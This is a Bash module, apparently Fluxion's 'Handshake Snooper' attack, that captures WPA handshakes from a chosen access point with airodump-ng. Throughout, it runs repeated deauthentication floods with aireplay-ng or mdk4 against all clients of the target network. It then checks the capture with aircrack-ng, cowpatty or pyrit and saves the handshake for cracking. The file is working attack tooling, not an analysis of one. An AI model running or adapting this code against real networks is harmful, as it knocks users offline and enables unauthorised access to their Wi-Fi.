#!/usr/bin/env bash

# ============================================================ #
# ============= < Handshake Snooper Parameters > ============= #
# ============================================================ #

HandshakeSnooperState="Not Ready"

# ============================================================ #
# ========= < Handshake Snooper Helper Subroutines > ========= #
# ============================================================ #
handshake_snooper_header() {
  fluxion_header; fluxion_target_show; echo
}

# ============================================================ #
# ============= < Handshake Snooper Subroutines > ============ #
# ============================================================ #
handshake_snooper_arbiter_daemon() {
  if [ ${#@} -lt 1 -o "$HandshakeSnooperState" != "Running" ]; then
    return 1;
  fi

  # Start daemon in the running state to continue execution until aborted,
  # or until a hash has been verified to exist in the capture file.
  # NOTE: The line below must remain before trap to prevent race conditions.
  local handshake_snooper_arbiter_daemon_state="running"

  handshake_snooper_arbiter_daemon_abort() {
    handshake_snooper_arbiter_daemon_state="aborted"
    if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
      kill $handshake_snooper_arbiter_daemon_viewerPID
    fi

    handshake_snooper_stop_deauthenticator
    handshake_snooper_stop_captor

    local -r now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $HandshakeSnooperArbiterAbortedWarning" >> \
      "$FLUXIONWorkspacePath/handshake_snooper.log"
    exit 2
  }

  trap handshake_snooper_arbiter_daemon_abort SIGABRT

  source "$FLUXIONLibPath/HashUtils.sh"
  source "$FLUXIONLibPath/ColorUtils.sh"

  # Cleanup files we've previously created to avoid conflicts.
  sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/dump-*"

  # Truncate the log before opening the viewer so tail -f starts clean,
  # with no stale content from previous runs and no "file truncated" message.
  > "$FLUXIONWorkspacePath/handshake_snooper.log"

  # Display some feedback to the user to assure verifier is working.
  fluxion_window_open handshake_snooper_arbiter_daemon_viewerPID \
    "Handshake Snooper Arbiter Log" "$BOTTOMLEFT" "#000000" "#CCCCCC" \
    "tail -f \"$FLUXIONWorkspacePath/handshake_snooper.log\""

  local now=$(env -i date '+%H:%M:%S')
  echo -e "[$now] $HandshakeSnooperStartingArbiterNotice" >> \
    "$FLUXIONWorkspacePath/handshake_snooper.log"

  handshake_snooper_start_captor
  handshake_snooper_start_deauthenticator

  local handshake_snooper_arbiter_daemon_verified=1 # Assume it hasn't been verified yet (1 => false/error).

  # Keep snooping and verifying until we've got a valid hash from the capture file.
  while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
      "$FLUXIONWorkspacePath/handshake_snooper.log"
    fluxion_status "SNOOPING interval=${HandshakeSnooperVerifierInterval}s"
    sleep $HandshakeSnooperVerifierInterval &
    wait $! # Using wait to asynchronously catch flags while waiting.

    # If synchronously searching, stop the captor and deauthenticator before checking.
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" ]; then
      now=$(env -i date '+%H:%M:%S')
      echo -e "[$now] $HandshakeSnooperStoppingForVerifierNotice" >> \
        "$FLUXIONWorkspacePath/handshake_snooper.log"
      handshake_snooper_stop_deauthenticator
      handshake_snooper_stop_captor
      mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
        "$FLUXIONWorkspacePath/capture/recent.cap"
    else
      if [ -x "$(command -v pyrit)" ]; then
        pyrit -r "$FLUXIONWorkspacePath/capture/dump-01.cap" \
          -o "$FLUXIONWorkspacePath/capture/recent.cap" stripLive &> \
          $FLUXIONOutputDevice
      else
        mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
           "$FLUXIONWorkspacePath/capture/recent.cap" &> $FLUXIONOutputDevice
      fi
    fi

    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $HandshakeSnooperSearchingForHashesNotice" >> \
      "$FLUXIONWorkspacePath/handshake_snooper.log"
    hash_check_handshake "$HandshakeSnooperVerifierIdentifier" \
      "$FLUXIONWorkspacePath/capture/recent.cap" \
      "$FluxionTargetSSID" "$FluxionTargetMAC"
    handshake_snooper_arbiter_daemon_verified=$?

    # If synchronously searching, restart the captor and deauthenticator after checking.
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" -a \
      $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
      sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/*"

      handshake_snooper_start_captor
      handshake_snooper_start_deauthenticator
    fi
  done

  # Assure all processes are stopped before proceeding.
  handshake_snooper_stop_deauthenticator
  handshake_snooper_stop_captor

  local completionTime=$(env -i date '+%H:%M:%S')
  echo -e "[$completionTime] $HandshakeSnooperArbiterSuccededNotice" >> \
    "$FLUXIONWorkspacePath/handshake_snooper.log"
  echo -e "[$completionTime] $HandshakeSnooperArbiterCompletedTip" >> \
    "$FLUXIONWorkspacePath/handshake_snooper.log"

  # Assure we've got a directory to store hashes into.
  mkdir -p "$FLUXIONPath/attacks/Handshake Snooper/handshakes/"

  # Move handshake to storage if one was acquired.
  mv "$FLUXIONWorkspacePath/capture/recent.cap" \
    "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"
  fluxion_status "HANDSHAKE_CAPTURED path=$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"

  # Write success flag so the main window polling loop can detect completion
  # and update its display without waiting for manual user input.
  touch "$FLUXIONWorkspacePath/handshake_success.flag"

  # Close the log viewer — success feedback is shown in the main window.
  if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
    kill $handshake_snooper_arbiter_daemon_viewerPID
  fi

  # Signal parent process the verification terminated.
  kill -s SIGABRT $1
}

handshake_snooper_stop_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then
    kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
  fi

  HandshakeSnooperCaptorPID=""
}

handshake_snooper_start_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

  handshake_snooper_stop_captor

  # Ensure jammer interface is in monitor mode and UP before starting captor
  # This prevents "interface down" errors during tracker restarts
  # Only set mode if not already in monitor mode to avoid disrupting the interface
  echo "Verifying captor interface monitor mode..." > $FLUXIONOutputDevice
  local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
  if [ "$currentMode" != "monitor" ]; then
    echo "Setting captor interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &> $FLUXIONOutputDevice; then
      echo "Warning: Failed to set captor interface to monitor mode" > $FLUXIONOutputDevice
    fi
    sleep 1
  else
    echo "Captor interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
  fi

  local parentPID
  fluxion_window_open parentPID \
    "Handshake Captor (CH $FluxionTargetChannel)" "$TOPLEFT" "#000000" "#FFFFFF" \
    "airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/capture/dump\" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface"

  while [ ! "$HandshakeSnooperCaptorPID" ]; do
    sleep 1 &
    wait $!
    HandshakeSnooperCaptorPID=$(pgrep -P $parentPID)
  done
}

handshake_snooper_stop_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
    kill $HandshakeSnooperDeauthenticatorPID &> $FLUXIONOutputDevice
  fi

  HandshakeSnooperDeauthenticatorPID=""
}

handshake_snooper_start_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

  handshake_snooper_stop_deauthenticator

  # Ensure jammer interface is in monitor mode before starting
  # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
  # Only set mode if not already in monitor mode to avoid disrupting the interface
  echo "Verifying jammer interface monitor mode..." > $FLUXIONOutputDevice
  local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
  if [ "$currentMode" != "monitor" ]; then
    echo "Setting jammer interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &> $FLUXIONOutputDevice; then
      echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
    fi
    sleep 1
  else
    echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
  fi

  # Start deauthenticators.
  case "$HandshakeSnooperDeauthenticatorIdentifier" in
    "$HandshakeSnooperAireplayMethodOption")
      fluxion_window_open HandshakeSnooperDeauthenticatorPID \
        "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done"
    ;;
    "$HandshakeSnooperMdk4MethodOption")
      fluxion_window_open HandshakeSnooperDeauthenticatorPID \
        "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -B $FluxionTargetMAC -c $FluxionTargetChannel; done"
    ;;
  esac
}


handshake_snooper_unset_deauthenticator_identifier() {
  if [ ! "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 1; fi
  HandshakeSnooperDeauthenticatorIdentifier=""
}

handshake_snooper_set_deauthenticator_identifier() {
  if [ "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 0; fi

  handshake_snooper_unset_deauthenticator_identifier

  if [ "$FLUXIONAuto" ]; then
    if [ "$FLUXIONDeauthMethod" = "mdk4" ]; then
      HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperMdk4MethodOption"
    else
      HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperAireplayMethodOption"  # Default to aireplay-ng in auto mode until mdk4's traffic-wait issue is fixed upstream.
    fi
    return 0
  fi

  local methods=(
    "$HandshakeSnooperMonitorMethodOption"
    "$HandshakeSnooperAireplayMethodOption"
    "$HandshakeSnooperMdk4MethodOption"
    "$FLUXIONGeneralBackOption"
  )
  io_query_choice "$HandshakeSnooperMethodQuery" methods[@]

  HandshakeSnooperDeauthenticatorIdentifier=$IOQueryChoice

  echo

  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
    "$FLUXIONGeneralBackOption" ]; then
    handshake_snooper_unset_deauthenticator_identifier
    return 1
  fi
}

handshake_snooper_unset_jammer_interface() {
  if [ ! "$HandshakeSnooperJammerInterface" ]; then
    HandshakeSnooperJammerInterfaceOriginal=""
    return 1
  fi

  # Deallocate the interface from FluxionInterfaces so it can be reused.
  # Pass the renamed interface (e.g. fluxwl0) — that's the current real name
  # in /sys/class/net, which fluxion_deallocate_interface needs for interface_is_real.
  fluxion_deallocate_interface "$HandshakeSnooperJammerInterface" 2>/dev/null

  HandshakeSnooperJammerInterface=""
  HandshakeSnooperJammerInterfaceOriginal=""

  # Check if we're automatically selecting the interface & skip
  # this one if so to take the user back properly.
  local interfacesAvailable
  readarray -t interfacesAvailable < <(attack_targetting_interfaces)

  if [ ${#interfacesAvailable[@]} -le 1 ]; then return 2; fi
}

handshake_snooper_set_jammer_interface() {
  if [ "$HandshakeSnooperJammerInterface" ]; then return 0; fi

  # NOTICE: The code below should be excluded because the interface selected
  # below is also being used as the monitoring interface (required)!
  #if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
  #  "$HandshakeSnooperMonitorMethodOption" ]; then return 0; fi

  if [ ! "$HandshakeSnooperJammerInterfaceOriginal" ]; then
    echo "Running get jammer interface." > $FLUXIONOutputDevice
    if ! fluxion_get_interface attack_targetting_interfaces \
      "$HandshakeSnooperJammerInterfaceQuery"; then
      echo "Failed to get jammer interface" > $FLUXIONOutputDevice
      return 1
    fi
    HandshakeSnooperJammerInterfaceOriginal=$FluxionInterfaceSelected
  fi

  local selectedInterface=$HandshakeSnooperJammerInterfaceOriginal

  # If the user picked a fluxwl* name from the interface list (already renamed by
  # the scanner), use it directly — fluxion_allocate_interface would try to rename
  # it again, and FluxionInterfaces[$fluxwl*] returns the original hw name (reverse
  # mapping), which no longer exists as an interface name.
  if [[ "$selectedInterface" == fluxwl* ]]; then
    HandshakeSnooperJammerInterface="$selectedInterface"
    local hwName="${FluxionInterfaces[$selectedInterface]}"
    [ -n "$hwName" ] && HandshakeSnooperJammerInterfaceOriginal="$hwName"
    return 0
  fi

  if ! fluxion_allocate_interface $selectedInterface; then
    echo "Failed to allocate jammer interface" > $FLUXIONOutputDevice
    return 2
  fi

  echo "Succeeded get jammer interface." > $FLUXIONOutputDevice

  # Use the renamed monitor interface (e.g. fluxwl0), not the original name.
  local jammerIface=${FluxionInterfaces[$selectedInterface]:-$selectedInterface}

  HandshakeSnooperJammerInterface=$jammerIface
}

handshake_snooper_unset_verifier_identifier() {
  if [ ! "$HandshakeSnooperVerifierIdentifier" ]; then return 1; fi
  HandshakeSnooperVerifierIdentifier=""
}

handshake_snooper_set_verifier_identifier() {
  if [ "$HandshakeSnooperVerifierIdentifier" ]; then return 0; fi

  handshake_snooper_unset_verifier_identifier

  if [ "$FLUXIONAuto" ]; then
    HandshakeSnooperVerifierIdentifier="cowpatty"
    return 0
  fi

  local choices=(
    "$FLUXIONHashVerificationMethodAircrackOption"
    "$FLUXIONHashVerificationMethodCowpattyOption"
  )
  # Add pyrit to the options is available.
  if [ -x "$(command -v pyrit)" ]; then
    choices+=("$FLUXIONHashVerificationMethodPyritOption")
  fi

  choices+=("$FLUXIONGeneralBackOption")

  io_query_choice "$FLUXIONHashVerificationMethodQuery" choices[@]

  echo

  case "$IOQueryChoice" in
    "$FLUXIONHashVerificationMethodPyritOption")
      HandshakeSnooperVerifierIdentifier="pyrit" ;;
    "$FLUXIONHashVerificationMethodAircrackOption")
      HandshakeSnooperVerifierIdentifier="aircrack-ng" ;;
    "$FLUXIONHashVerificationMethodCowpattyOption")
      HandshakeSnooperVerifierIdentifier="cowpatty" ;;
    "$FLUXIONGeneralBackOption")
      handshake_snooper_unset_verifier_identifier
      return 1
      ;;
  esac
}

handshake_snooper_unset_verifier_interval() {
  if [ ! "$HandshakeSnooperVerifierInterval" ]; then return 1; fi
  HandshakeSnooperVerifierInterval=""
}

handshake_snooper_set_verifier_interval() {
  if [ "$HandshakeSnooperVerifierInterval" ]; then return 0; fi

  handshake_snooper_unset_verifier_interval

  if [ "$FLUXIONAuto" ]; then
    HandshakeSnooperVerifierInterval=30
    return 0
  fi

  local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$FLUXIONGeneralBackOption")
  io_query_choice "$HandshakeSnooperVerifierIntervalQuery" choices[@]

  case "$IOQueryChoice" in
    "$HandshakeSnooperVerifierInterval30SOption")
      HandshakeSnooperVerifierInterval=30 ;;
    "$HandshakeSnooperVerifierInterval60SOption")
      HandshakeSnooperVerifierInterval=60 ;;
    "$HandshakeSnooperVerifierInterval90SOption")
      HandshakeSnooperVerifierInterval=90 ;;
    "$FLUXIONGeneralBackOption")
      handshake_snooper_unset_verifier_interval
      return 1
      ;;
  esac
}

handshake_snooper_unset_verifier_synchronicity() {
  if [ ! "$HandshakeSnooperVerifierSynchronicity" ]; then return 1; fi
  HandshakeSnooperVerifierSynchronicity=""
}

handshake_snooper_set_verifier_synchronicity() {
  if [ "$HandshakeSnooperVerifierSynchronicity" ]; then return 0; fi

  handshake_snooper_unset_verifier_synchronicity

  if [ "$FLUXIONAuto" ]; then
    HandshakeSnooperVerifierSynchronicity="non-blocking"
    return 0
  fi

  local choices=(
    "$HandshakeSnooperVerifierSynchronicityAsynchronousOption"
    "$HandshakeSnooperVerifierSynchronicitySynchronousOption"
    "$FLUXIONGeneralBackOption"
  )

  io_query_choice "$HandshakeSnooperVerifierSynchronicityQuery" choices[@]

  case "$IOQueryChoice" in
    "$HandshakeSnooperVerifierSynchronicityAsynchronousOption")
      HandshakeSnooperVerifierSynchronicity="non-blocking" ;;
    "$HandshakeSnooperVerifierSynchronicitySynchronousOption")
      HandshakeSnooperVerifierSynchronicity="blocking" ;;
    "$FLUXIONGeneralBackOption")
      handshake_snooper_unset_verifier_synchronicity
      return 1
      ;;
  esac
}


# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if [ ! "$HandshakeSnooperCLIArguments" ]; then
  if ! HandshakeSnooperCLIArguments=$(
    getopt --options="v:i:j:a" \
      --longoptions="verifier:,interval:,jammer:,asynchronous" \
      --name="Handshake Snooper V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
    );then
    echo -e "${CRed}Aborted$CClr, parameter error detected..."
    sleep 5
    fluxion_handle_exit
  fi

  declare -r HandshakeSnooperCLIArguments=$HandshakeSnooperCLIArguments

  eval set -- "$HandshakeSnooperCLIArguments" # Set environment parameters.
fi


# ============================================================ #
# ============= < Argument Loaded Configurables > ============ #
# ============================================================ #
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -v|--verifier)
      HandshakeSnooperVerifierIdentifier=$2; shift;;
    -i|--interval)
      HandshakeSnooperVerifierInterval=$2; shift;;
    -j|--jammer)
      HandshakeSnooperJammerInterfaceOriginal=$2; shift;;
    -a|--asynchronous)
      HandshakeSnooperVerifierSynchronicity="non-blocking";;
  esac
  shift # Shift new parameters
done


# ============================================================ #
# ===================== < Fluxion Hooks > ==================== #
# ============================================================ #
attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

attack_tracking_interfaces() {
  # Determine required band from target channel.
  local __requiredBand=""
  if [ "$FluxionTargetChannel" ]; then
    local __ch=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
    if [ -n "$__ch" ] && [ "$__ch" -gt 14 ]; then
      __requiredBand="5GHz"
    fi
  fi
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    if [ "$__requiredBand" ]; then
      interface_bands "$interface" 2>/dev/null
      if [[ "${InterfaceBands:-}" != *"$__requiredBand"* ]]; then continue; fi
    fi
    echo "$interface"
  done
  echo "" # This enables the Skip option.
}

unprep_attack() {
  HandshakeSnooperState="Not Ready"

  handshake_snooper_unset_verifier_synchronicity
  handshake_snooper_unset_verifier_interval
  handshake_snooper_unset_verifier_identifier
  handshake_snooper_unset_jammer_interface
  handshake_snooper_unset_deauthenticator_identifier

  sandbox_remove_workfile "$FLUXIONWorkspacePath/capture"

  # Always return success to allow tracker channel change handling to continue
  return 0
}

prep_attack() {
  mkdir -p "$FLUXIONWorkspacePath/capture"

  IOUtilsHeader="handshake_snooper_header"

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local sequence=(
    "set_deauthenticator_identifier"
    "set_jammer_interface"
    "set_verifier_identifier"
    "set_verifier_interval"
    "set_verifier_synchronicity"
  )

  if ! fluxion_do_sequence handshake_snooper sequence[@]; then
    return 1
  fi

  HandshakeSnooperState="Ready"
}

load_attack() {
  local -r configurationPath=$1

  local configuration
  readarray -t configuration < "$configurationPath"

  HandshakeSnooperDeauthenticatorIdentifier=${configuration[0]}
  HandshakeSnooperJammerInterfaceOriginal=${configuration[1]}
  HandshakeSnooperVerifierIdentifier=${configuration[2]}
  HandshakeSnooperVerifierInterval=${configuration[3]}
  HandshakeSnooperVerifierSynchronicity=${configuration[4]}
}

save_attack() {
  local -r configurationPath=$1

  # Store/overwrite attack configuration for pause & resume.
  # Order: DeauthID, JammerWI, VerifId, VerifInt, VerifSync
  echo "$HandshakeSnooperDeauthenticatorIdentifier" > "$configurationPath"
  echo "$HandshakeSnooperJammerInterfaceOriginal" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierIdentifier" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierInterval" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierSynchronicity" >> "$configurationPath"
}

stop_attack() {
  if [ "$HandshakeSnooperArbiterPID" ]; then
    kill -s SIGABRT $HandshakeSnooperArbiterPID &> $FLUXIONOutputDevice
  fi

  HandshakeSnooperArbiterPID=""

  HandshakeSnooperState="Stopped"
}

start_attack() {
  if [ "$HandshakeSnooperState" = "Running" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Ready" ]; then return 1; fi
  HandshakeSnooperState="Running"

  handshake_snooper_arbiter_daemon $$ &> $FLUXIONOutputDevice &
  HandshakeSnooperArbiterPID=$!
}

# FLUXSCRIPT END
